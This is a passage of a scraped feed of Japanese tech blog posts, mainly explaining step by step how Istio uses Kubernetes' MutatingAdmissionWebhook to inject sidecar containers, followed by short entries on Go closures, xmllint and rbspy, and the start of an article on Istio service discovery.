istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dkube-apiserver ➡︎ Serviceここで説明するフロー箇所『kube-apiserver ➡︎ Service』の箇所を説明します。(画像はタブ開き閲覧を推奨)(2) 認証/認可処理をコールkube-apiserverは、認証ステップと認可ステップにて、クライアントからのリクエストを許可します。(3) アドオンの処理をコールkube-apiserverは、mutating-admissionステップにて、MutatingAdmissionWebhookプラグインの処理をコールします。前提知識の部分で具体的な実装を省略しましたが、Istioのバージョン1.14.3時点で、MutatingWebhookConfigurationは以下のようになっています。Namespaceでサイドカーインジェクションを有効化する時に使用したエイリアスは、このMutatingWebhookConfigurationで実体のリビジョン番号と紐づいています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yamlapiVersion: admissionregistration.k8s.io/v1beta1kind: MutatingWebhookConfigurationmetadata:  name: istio-revision-tag-default  labels:    app: sidecar-injector    # エイリアスの実体    istio.io/rev: <リビジョン番号>    # リビジョン番号のエイリアス    istio.io/tag: <エイリアス>webhooks:  - name: rev.namespace.sidecar-injector.istio.io    # MutatingAdmissionWebhookプラグインの処理の発火条件を登録する。    rules:      - apiGroups: [\\"\\"]        apiVersions: [\\"v1\\"]        operations: [\\"CREATE\\"]        resources: [\\"pods\\"]        scope: \\"*\\"    # Webhookの前段にあるServiceの情報を登録する。    clientConfig:      service:        name: istiod-<リビジョン番号>        namespace: istio-system        path: \\"/inject\\" # エンドポイント        port: 443      caBundle: Ci0tLS0tQk ...    # Namespace単位のサイドカーインジェクション    # 特定のNamespaceでMutatingAdmissionWebhookプラグインの処理を発火させる。    namespaceSelector:      matchExpressions:        - key: istio.io/rev          operator: DoesNotExist        - key: istio-injection          operator: DoesNotExist    # Pod単位のサイドカーインジェクション    # 特定のオブジェクトでMutatingAdmissionWebhookプラグインの処理を発火させる。    objectSelector:      matchExpressions:        - key: sidecar.istio.io/inject          operator: NotIn          values:            - \\"false\\"        - key: istio.io/rev          operator: In          values:            - <エイリアス>    ...MutatingWebhookConfigurationには、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を定義します。MutatingAdmissionWebhookプラグインの発火条件に関して、例えばIstioでは、 NamespaceやPod.metadata.labelsキーに応じてサイドカーインジェクションの有効化/無効化を切り替えることができ、これをMutatingAdmissionWebhookプラグインで制御しています。webhookサーバーの宛先情報に関して、Istioではwebhookサーバーの前段にServiceを配置しています。MutatingAdmissionWebhookプラグインが発火した場合、Serviceの/inject:443にHTTPSプロトコルのリクエストを送信するようになっています。また、宛先のServiceの名前がistiod-<リビジョン番号>となっていることからもわかるように、Serviceは特定のバージョンのIstiodコントロールプレーンに対応しており、想定外のバージョンのIstiodコントロールプレーンを指定しないように制御しています。一方で発火しなかった場合には、以降のAdmissionReviewの処理には進みません。(4) AdmissionRequestに値を詰めるkube-apiserverは、mutating-admissionステップにて、クライアントからのリクエスト内容 (Podの作成リクエスト) をAdmissionReveiew構造体のAdmissionRequestに詰めます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"core\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"pods\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}(5) AdmissionReviewを送信kube-apiserverは、mutating-admissionステップにて、Serviceの/inject:443にAdmissionReview構造体を送信します。Service ➡︎ webhookサーバーここで説明するフロー箇所『Service ➡︎ webhookサーバー』の箇所を説明します。(画像はタブ開き閲覧を推奨)(6) 15017番ポートにポートフォワーディングServiceは、/inject:443でリクエストを受信し、discoveryコンテナの15017番ポートにポートフォワーディングします。Istioのバージョン1.14.3時点で、Serviceは以下のようになっています。$ kubectl get svc istiod-service -n istio-system -o yamlapiVersion: v1kind: Servicemetadata:  labels:    app: istiod  name: istiod-<リビジョン番号>  namespace: istio-systemspec:  type: ClusterIP  selector:    app: istiod    istio.io/rev: <リビジョン番号>  ports:    - name: grpc-xds      port: 15010      protocol: TCP      targetPort: 15010    - name: https-dns      port: 15012      protocol: TCP      targetPort: 15012    # webhookサーバーにポートフォワーディングする。    - name: https-webhook      port: 443      protocol: TCP      targetPort: 15017    - name: http-monitoring      port: 15014      protocol: TCP      targetPort: 15014.spec.selector.istio.io/revキーに、ポートフォワーディング先のPodを指定するためのリビジョン番号が設定されており、このPodはdiscoveryコンテナを持ちます。Istioは、discoveryコンテナ内でwebhookサーバーを実行し、15017番ポートでリクエストを待ち受けます。▶ istio.io/rev`discovery`コンテナの待ち受けポートについてdiscoveryコンテナがリクエストを待ち受けているポート番号を見てみると、15017番ポートでリッスンしていることを確認できます\uD83D\uDC4D$ kubectl exec foo-istiod -n istio-system -- netstat -tulpnActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 127.0.0.1:9876          0.0.0.0:*               LISTEN      1/pilot-discoverytcp6       0      0 :::15017                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::8080                 :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15010                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15012                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15014                :::*                    LISTEN      1/pilot-discoveryistio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubhttps://istio.io/latest/docs/ops/deployment/requirements/#ports-used-by-istiokube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所『kube-apiserver ⬅︎ Service ⬅︎ webhookサーバー』の箇所を説明します。矢印が逆向きなことに注意してください。(画像はタブ開き閲覧を推奨)(7) patch処理を定義仕組みの中でも、ここは重要な部分です。discoveryコンテナ内のwebhookサーバーは、リクエスト内容を書き換えるためのpatch処理を定義します。webhookサーバーは、マニフェストの.spec.containers[1]パスにistio-proxyキーを追加させるようなpatch処理を定義します。この定義によって、結果的にサイドカーのインジェクションが起こるということになります。[  ...  {    \\"op\\": \\"add\\",    # .spec.initContainers[1] を指定する。    \\"path\\": \\"/spec/initContainers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-init\\",      \\"resources\\": {                     ...      }    }  },  {    \\"op\\": \\"add\\",    # .spec.containers[1] を指定する。    \\"path\\": \\"/spec/containers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-proxy\\",      \\"resources\\": {                     ...      }    }  }  ...]istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubistio/pkg/kube/inject/webhook_test.go at 1.14.3 \xb7 istio/istio \xb7 GitHubこの時、サイドカーのテンプレートに割り当てられた値が、patch処理を内容を決めます。type SidecarTemplateData struct {    TypeMeta             metav1.TypeMeta    DeploymentMeta       metav1.ObjectMeta    ObjectMeta           metav1.ObjectMeta    Spec                 corev1.PodSpec    ProxyConfig          *meshconfig.ProxyConfig    MeshConfig           *meshconfig.MeshConfig    Values               map[string]interface{}    Revision             string    EstimatedConcurrency int    ProxyImage           string}...istio/pkg/kube/inject/inject.go at 1.14.3 \xb7 istio/istio \xb7 GitHub▶ patch処理でインジェクションするコンテナについてistio-proxyコンテナの他に、InitContainerのistio-initコンテナもインジェクション可能にします。このistio-initコンテナは、Pod内にiptablesのルールを適用し、Podのインバウンド通信／アウトバウンド通信をistio-proxyコンテナにリダイレクトさせる責務を担います\uD83D\uDCAA\uD83C\uDFFBIstio Sidecar\'s interception mechanism for traffic - SoByte(8) AdmissionResponseに値を詰めるdiscoveryコンテナ内のwebhookサーバーは、patch処理の定義をAdmissionReveiew構造体のAdmissionResponseに詰めます。patchキーの値に、先ほどのpatch処理の定義をbase64方式でエンコードした文字列が割り当てられています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"*****\\",      \\"allowed\\": true,      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"<先ほどのpatch処理の定義をbase64方式でエンコードした文字列>\\",    },}istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHub(9) AdmissionReviewを返信discoveryコンテナ内のwebhookサーバーは、AdmissionReview構造体をレスポンスとしてkube-apiserverに返信します。kube-apiserver ➡︎ etcdここで説明するフロー箇所『kube-apiserver ➡︎ etcd』の箇所を説明します。(画像はタブ開き閲覧を推奨)(10) patch処理をコールkube-apiserverは、AdmissionReview構造体を受信し、AdmissionResponseに応じてリクエスト内容を書き換えます。patch処理の定義をAdmissionReview構造体から取り出し、クライアントからのリクエスト内容を書き換えます。具体的には、istio-proxyコンテナとistio-initコンテナを作成するために、リクエストしたマニフェストの該当箇所にキーを追加します。apiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80    # kube-apiserverが追加    - name: istio-proxy      ...  # kube-apiserverが追加  initContainers:    - name: istio-init    ...(11) マニフェストを永続化kube-apiserverは、etcdにPodのマニフェストを永続化します。クライアント ⬅︎ kube-apiserverここで説明するフロー箇所『クライアント ⬅︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(12) コール完了を返信kube-apiserverは、クライアントにレスポンスを受信します。$ kubectl apply -f foo-pod.yaml# kube-apiserverからレスポンスが返ってくるpod \\"foo-pod\\" created以降の仕組み(画像はタブ開き閲覧を推奨)kube-apiserverは、他のNodeコンポーネント (kube-controlleretcd、kube-scheduler、kubeletなど) と通信し、Podを作成します。このPodのマニフェストは、アプリコンテナの他に、istio-proxyコンテナとistio-initコンテナを持ちます。結果として、サイドカーコンテナのistio-proxyコンテナをインジェクションしたことになります。▶ kube-apiserverと他コンポーネントの通信についてKubernetes Master Components: Etcd, API Server, Controller Manager, and Scheduler | by Jorge Acetozi | jorgeacetozi | Medium05. おわりにサービスメッシュの登場とIstioのサイドカーインジェクションの仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。今回登場したMutatingAdmissionWebhookプラグインに関して、私の関わっているプロダクトではIstio以外 (例：CertManager、Prometheus、AWSのaws-eks-vpc-cniアドオンなど) でも使用しています✌️そのため、MutatingAdmissionWebhookプラグインをどのように使っているのかを一度知れば、知識の汎用性が高いと考えています。サイドカーインジェクションはIstioでも基本的な機能であり、もし未体験の方がいらっしゃれば、お手元でサイドカーコンテナが追加されることを確認していただくとよいかもしれません\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-01-14T13:38:15.000Z","dateMiliSeconds":1673703495000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"The Diary of fighting with COVID-19? Day-4","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-4-dd2561d21338?source=rss-c54ac439ad2b------2","isoDate":"2023-01-14T11:25:46.000Z","dateMiliSeconds":1673695546000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"The Diary of fighting with COVID-19? Day-3","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-3-fa8a830320d3?source=rss-c54ac439ad2b------2","isoDate":"2023-01-13T13:21:39.000Z","dateMiliSeconds":1673616099000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"xmllint で HTML 内の任意の値を取り出す","link":"https://blog.1q77.com/2023/01/xmllint-html-xpath/","contentSnippet":"サクッと shell script で HTML の中の何かを取り出したい時があります。そんな時に使えるのが xmllint.しっかりやるなら python の Beautiful Soup を使ったりしますが、本当に簡単なことを簡単にやりたい場合に xmllint でサクッとやったメモ。","isoDate":"2023-01-12T14:40:51.000Z","dateMiliSeconds":1673534451000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"The Diary of fighting with COVID-19? Day-2","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-2-59fc403b0fea?source=rss-c54ac439ad2b------2","isoDate":"2023-01-12T13:20:43.000Z","dateMiliSeconds":1673529643000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"The Diary of fighting with COVID-19? Day-1","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-1-3abeaf7e9399?source=rss-c54ac439ad2b------2","isoDate":"2023-01-11T13:35:26.000Z","dateMiliSeconds":1673444126000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"ぼちぼちブログでもはじめます","link":"https://moz-security.hatenablog.com/entry/2023/01/04/111143","contentSnippet":"もう新年始まって気づいたら４日目ですが、明けましておめでとうございます。アウトプットの場として2023年になり、気持ちを新たにして、なにか新しいことを始めようと思ったときに、前々からいつかやろうと思っていたブログを書くことに決めました。（いつかやろうを今やることは大事だと思う。）ここらへんで、一応、自己紹介しておきたいと思います。私は、現在、大学で情報理工学を学んでいて、ネットワークやセキュリティに興味を持っています。今までやってきたこととしては、B2のときに基本情報技術者試験、B3のときに応用情報技術者試験に合格し、他には、セキュリティ・ミニキャンプ オンライン・東京 に参加したり、Hack The Boxを少しずつやってきました。（秋学期になってからHTBはほとんど触れていないが…）他にも、いろんな勉強会にも参加してきました。今はオンラインで気軽に参加できるので。ブログを書こうかなと考えた理由は大きく３つありまして。１つ目は、セキュリティ・ミニキャンプのグループ活動でLT大会をしたときに、やっぱりアウトプットの場というのがあることで、より知識の定着につながることが実感できたからです。大学生になってからは、インプットがメインになっていてアウトプットの場がなかなかないため、どうアウトプットするのかというのは考える必要がありました。Twitterでもアウトプットはできるし、実際にそれを使っていましたが、文字数に制限があるため、正しく文章を書くには向いていません。（気楽にツイートできることがTwitterの良さではあるのですが。）２つ目は、自分の言語化能力の向上のためです。自分の頭には考えがあるのに、それをうまく伝えられなかったり、わかりにくい説明になっていたりしていたため、どうすればわかりやすく説明できるのかというのは前からの悩みでした。そこでいろいろ考えたときに自分の頭にあることを言語化するというのは、結構慣れの要素が大きいと思うため、経験を積むことが大事だという結論にいたり、それならば、早く始めた方がいいというのが、ブログを書くきっかけにもなっています。３つ目は、エンジニアになるなら、自分の技術力（今までどんなことをやってきたのか、私はどんなことができるのか）を証明するためにも技術ブログは書いておくといいということを聞くことが多いからです。今は、いきなり技術ブログを書くのは敷居が高いため、気楽に書けるこのHatena Blogでしか記事を書いていませんが、今年中には、QitaやZennの方に、技術系の記事を投稿していきたいと思っています。ブログを書く前に、Hatena Blogを使うかも結構迷っていて、自分で個人ブログサイトを作ろうかとも思ったのですが、そこに時間をかける前にさっさとブログを書き始めようということで、こちらを選択しました。そのため、今年中には、個人のブログサイトを作ってそちらに移行したいと思っています。（願望）このHatena Blogでは、月に１回は投稿していく予定です。内容としては、その月にやってきたこととか新たな発見があったこと、自分の書きたいことを勝手に発信していく感じで。ここであらかじめ宣言しておくことで、自分を追い込んでいくスタイル。（笑）技術的な話は、QiitaやZennの方に書くかもしれませんが、もしかしたら、こっちで書くかもしれません。全然考えていないため、そこら辺はこれから考えていきたいと思います。とりあえず、人生初めてのブログは、こんな感じで終わりたいと思います。近々、新年の抱負として、今年やりたいことを書きたいと思っています。","isoDate":"2023-01-04T02:11:43.000Z","dateMiliSeconds":1672798303000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Lima の vmType VZ と virtiofs を試す","link":"https://blog.1q77.com/2022/12/lima-vz/","contentSnippet":"Lima が version 0.14.0 で QEMU だけではなく macOS の Virtualization.Framework に対応していました。vmtype という設定項目が増えています。この新しい Framework では Host のディレクトリをマウントするのに virtiofs が使えるようになっており、QEMU での reverse-sshfs や 9p よりもパフォーマンスが良いらしいので試してみます。","isoDate":"2022-12-29T15:49:47.000Z","dateMiliSeconds":1672328987000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"クロージャーのメモリ割り当てについて(Go言語)","link":"https://kechigon.hatenablog.com/entry/2022/12/29/203946","contentSnippet":"A Tour of GoでGo言語に入門していて、クロージャーのメモリ割り当てについて疑問に思ったので調べた。クロージャーとはA Tour of Go での説明をまとめると、本体の外部から変数を参照する関数値関数は、参照した変数にアクセスして割り当てることができるという特徴がある。サンプルコードpackage mainimport \\"fmt\\"func adder() func() int {    sum := 0    return func() int {        sum++        return sum    }}func main() {    f := adder()    for i := 0; i < 10; i++ {        fmt.Println(f())    }}出力12345678910adder 関数はクロージャーを返し、各クロージャーは、sum 変数にバインドされている。疑問点サンプルコードではクロージャーが、adder関数で定義されたsum変数を参照、割り当てしてる。しかし、関数呼び出しといえばスタックフレームを用いるイメージしかない私にとっては、sum変数の参照がどこに残っているのか疑問。おそらくヒープ領域に割り当てられてる？GitHub issue でのやり取り調べたところ、同じ疑問に答えているissueを見つけた。質問者は、同じような処理をクロージャーを使用する場合と使用しない場合で試している。そして、クロージャーを使用した場合だとヒープ領域への割り当てが行われると言っている。実際のコードpackage mainimport (    \\"fmt\\"    \\"sync\\"    \\"testing\\")type Object struct {}var p sync.Pool = sync.Pool{    New: func() interface{} {        return &Object{}    },}type Func struct {    ctx interface{}}func (this *Func) Run() {    p.Put(this.ctx)  }func RunWithFunc() Func {    ctx := p.Get()    return Func{ctx: ctx}}func RunWithClosure() func() {    ctx := p.Get()    return func() { p.Put(ctx) }}func Test1() {    cleanup := RunWithFunc()    cleanup.Run()}func Test2() {    cleanup := RunWithClosure()    cleanup()}func main() {    f1 := testing.AllocsPerRun(1000, Test1)    f2 := testing.AllocsPerRun(1000, Test2)    // 0    fmt.Println(f1)    // 1    fmt.Println(f2)}コードの詳しい内容は、クロージャーを使わないRunWithFuncと使用するRunWithClosureを実行する。どちらも大雑把に言うと、空の構造体をsync.Poolから取り出したり戻したりする。クロージャーを使うとヒープ領域への割り当てが行われることをtesting.AllocsPerRunが示す。といった感じ。回答者は以下のように言っている。問題は、RunWithClosure がクロージャーを返す必要があることです。関数が実行される前にスタック フレームがなくなるため、スタックに割り当てることができません。 可能な場合は、スタックにクロージャーを割り当てます。スタック上にクロージャ（これらの2つのフィールドの匿名構造体）を割り当て、呼び出された関数にそれらへのポインタを渡すことができますし、実際に行っています。ここでの問題は、その構造体がRunWithClosureの内部で割り当てられ、RunWithClosureのフレームは、cleanupを呼び出すまでになくなってしまうことです。そのため、RunWithClosureのフレームでクロージャを割り当てることはできません。それは、ヒープ上に割り当てられなければなりません。もし、RunWithClosureをその呼び出し元にインライン化すれば、そのスタック・フレームが十分に長く生きるので、呼び出し元でクロージャを割り当てることができるようになります。クロージャーが実行される前に、参照先をもつスタックフレームがなくなってしまう場合、それをヒープ領域に割り当てるらしい。またそれを避けたい場合は、関数になっている部分をインライン化するといいらしい。まとめGo言語に入門していて、クロージャーが参照している変数がどこに残っているか疑問に思ったが、GitHub issueのやり取りから、予想した通り、ヒープ領域への割り当てが行われていることがわかった。","isoDate":"2022-12-29T11:39:46.000Z","dateMiliSeconds":1672313986000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"rbspy で ruby の stacktrace を flamegraph にする","link":"https://blog.1q77.com/2022/12/rbspy/","contentSnippet":"中身をよく知らない Rails アプリでどこが遅いのかな？と思って rbspy (github) を試してみたのでメモ。とりあえず使って flamegraph を書き出してみたんだけどそもそも flamegraph がどういうものなのか分かってなくて困ったのでドキュメントを読んでみた。","isoDate":"2022-12-28T11:26:10.000Z","dateMiliSeconds":1672226770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Professional Cloud Security Engineer の振り返り","link":"https://qiita.com/dirtymosschan/items/2c66eec7919220a4ec06","contentSnippet":"はじめに2022/12/28 に Google Cloud Certification の１つである、Professional Cloud Security Engineer に合格したので、そちらの振り返りをしようと思います。こちらの記事では、出題内容の詳細は記載し...","isoDate":"2022-12-28T08:57:17.000Z","dateMiliSeconds":1672217837000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"【Istio⛵️】Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/25/060000","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️サービスディスカバリーの種類についてIstioのサービス間通信を実現するサービスディスカバリーの仕組みについて記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとはなぜサービスディスカバリーが必要なのかサービスディスカバリーの要素サービスディスカバリーのパターンサービスディスカバリーのパターンとはサーバーサイドパターンクライアントサイドパターン03. Istioのサービスディスカバリーの仕組み全体像(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるロードバランシングdiscoveryコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるリクエスト受信04. istio-proxyコンテナ内のEnvoyの仕組み全体像(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるエンドポイント選択(6) 宛先マイクロサービスへのリクエスト送信EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイントリスナー▼ 確認方法▼ 結果ルート▼ 確認方法▼ 結果クラスター▼ 確認方法▼ 結果エンドポイント▼ 確認方法▼ 結果Envoyの処理の流れのまとめ(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるクラスター選択(6) 宛先マイクロサービスへのリクエスト送信05. おわりに謝辞記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F3-shake Advent Calender 2022 最終日の記事です\uD83C\uDF85普段、私は 俺の技術ノート に知見を記録しており、はてなブログはデビュー戦となります。最近の業務で、オンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、Istioのサービス間通信を実現するサービスディスカバリーの仕組みを記事で解説しました。Istioの機能の1つであるサービスディスカバリーは、その仕組みの多くをEnvoyに頼っているため、合わせてEnvoyの仕組みも説明します。それでは、もりもり布教していきます\uD83D\uDE1702. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとは平易な言葉で言い換えると サービス間通信 です。マイクロサービスアーキテクチャでは、マイクロサービスからマイクロサービスにリクエストを送信する場面があります。サービスディスカバリーとは、宛先マイクロサービスの宛先情報 (例：IPアドレス、完全修飾ドメイン名など) を検出し、送信元マイクロサービスが宛先マイクロサービスにリクエストを継続的に送信可能にする仕組みのことです。なぜサービスディスカバリーが必要なのかそもそも、なぜサービスディスカバリーが必要なのでしょうか。マイクロサービスアーキテクチャでは、システムの信頼性 (定められた条件下で定められた期間にわたり、障害を発生させることなく実行する程度) を担保するために、マイクロサービスのインスタンスの自動スケーリングを採用します。この時、自動スケーリングのスケールアウトでマイクロサービスが増加するたびに、各インスタンスには新しい宛先情報が割り当てられてしまいます。また、マイクロサービスが作り直された場合にも、宛先情報は更新されてしまいます。このように、たとえインスタンスの宛先情報が更新されたとしても、インスタンスへのリクエストに失敗しない仕組みが必要です。サービスディスカバリーの要素サービスディスカバリーの仕組みは、次の要素からなります。名前解決は、DNSベースのサービスディスカバリー (例：CoreDNS + Service + kube-proxyによるサービスディスカバリー) で必要となり、Istioでは使いません。そのため、本記事では言及しないこととします\uD83D\uDE47\uD83C\uDFFB‍ 要素                    責務                                                              送信元マイクロサービス  リクエストを送信する。                                            宛先マイクロサービス    リクエストを受信する。                                            サービスレジストリ      宛先マイクロサービスの宛先情報を保管する。                        ロードバランサー        宛先マイクロサービスのインスタンスにロードバランシングする。      名前解決                宛先マイクロサービスへのリクエスト送信時に、名前解決可能にする。 サービスディスカバリーのパターンサービスディスカバリーのパターンとはサービスディスカバリーの実装方法にはいくつか種類があります。Istioのサービスディスカバリーは、このうちのサーバーサイドパターンを実装したものになります。サーバーサイドパターン送信元マイクロサービスから、問い合わせとロードバランシングの責務が切り離されています。送信元マイクロサービスは、ロードバランサーにリクエストを送信します。ロードバランサーは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、またリクエストをロードバランシングする責務を担っています\uD83D\uDCAA\uD83C\uDFFB(例) Istio、Linkerd、CoreDNS、AWS ALBなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Server-side service discoveryクライアントサイドパターン通信の送信元マイクロサービスは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、さらにロードバランシングする責務を担います。(例) NetflixのEureka、kube-proxyなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Client-side service discoveryService Discovery in Kubernetes: Combining the Best of Two Worlds03. Istioのサービスディスカバリーの仕組みIstioが実装するサービスメッシュには、サイドカープロキシメッシュとアンビエントメッシュがあり、今回はサイドカープロキシメッシュのサービスディスカバリーを取り上げます。Istioのサービスディスカバリーは、discoveryコンテナとistio-proxyコンテナが軸となり、サーバーサイドパターンのサービスディスカバリーを実装します。全体像(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47istio-proxyコンテナは、サービスレジストリへの問い合わせと、ロードバランシングする責務を担っていることに注目してください。(1) kube-apiserverによる宛先情報保管kube-apiserverは、Pod等の宛先情報をetcd等に保管します。これは、Kubernetesの通常の仕組みです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナは、kube-apiserverからPod等の宛先情報を取得し、自身に保管します。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナは、discoveryコンテナからPod等の宛先情報を双方向ストリーミングRPCで取得します。(4) istio-proxyコンテナによるリクエスト受信送信元マイクロサービスがリクエストを送信します。サーバーサイドパターンでの責務通り、送信元マイクロサービスはロードバランサー (ここではistio-proxyコンテナ) にリクエストを送信します。この時、送信元マイクロサービスがistio-proxyコンテナに直接的にリクエストを送信しているというよりは、iptablesがistio-proxyコンテナにリクエストをリダイレクトします。istio-proxyコンテナこれを受信します。(5) istio-proxyコンテナによるロードバランシングistio-proxyコンテナは、リクエストをロードバランシングし、また宛先Podに送信します。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blogdiscoveryコンテナの仕組み全体像の中から、discoveryコンテナを詳しく見てみましょう。discoveryコンテナは、別名Istiodと呼ばれています。XDS-APIというエンドポイントを公開しており、XDS-APIのうち、サービスディスカバリーに関係するAPIは以下の通りです。今回は詳しく言及しませんが、istio-proxyコンテナがHTTPSリクエストを処理するために、証明書を配布するためのSDS-APIもあります。 APIの種類  説明                                                   LDS-API    Envoyのリスナーを取得できる。                          RDS-API    Envoyのルートを取得できる。                            CDS-API    Envoyのクラスターを取得できる。                        EDS-API    Envoyのエンドポイントできる。                          ADS-API    各XDS-APIから取得できる宛先情報を整理して取得できる。 Istio in Action(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得XDS-APIとistio-proxyコンテナの間では、gRPCの双方向ストリーミングRPCの接続が確立されています。そのため、istio-proxyコンテナからのリクエストに応じて宛先情報を返却するだけでなく、リクエストがなくとも、XDS-APIからもistio-proxyコンテナに対して宛先情報を送信します。XDS-APIのエンドポイントがいくつかあり、各エンドポイントから宛先情報を取得できます。一方で、各エンドポイントからバラバラに宛先情報を取得すると、Envoy上でこれを整理する時に、宛先情報のバージョンの不整合が起こる可能性があります。そのため、Istioは実際にはADS-APIを使用して宛先情報を取得します。istio-proxyコンテナの仕組み全体像の中から、istio-proxyコンテナを詳しく見てみましょう。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blog(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナでは、pilot-agentとEnvoyが稼働しています。先ほどistio-proxyコンテナは、双方向ストリーミングRPCでADS-APIから宛先情報を取得すると説明しました。厳密にはEnvoyが、pilot-agentを介して、ADS-APIから双方向ストリーミングRPCで宛先情報を取得します。(4) istio-proxyコンテナによるリクエスト受信istio-proxyコンテナによるリクエスト受信 と同じです。(5) istio-proxyコンテナによるリクエスト受信EnvoyはADS-APIから取得した宛先情報に基づいて、宛先マイクロサービスのインスタンスにロードバランシングします。04. istio-proxyコンテナ内のEnvoyの仕組み全体像EnvoyがADS-APIから取得した宛先情報を見ていく前に、Envoyの処理の流れを解説します。istio-proxyコンテナ内のEnvoyでは、以下の仕組みでHTTPリクエストを処理します。(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47Istio in Action (English Edition)Istio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and ObserveArchitecture Analysis of Istio: The Most Popular Service Mesh Project - Alibaba Cloud Community(1) 送信元マイクロサービスからリクエスト受信istio-proxyコンテナは、送信元マイクロサービスからリクエストを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先情報 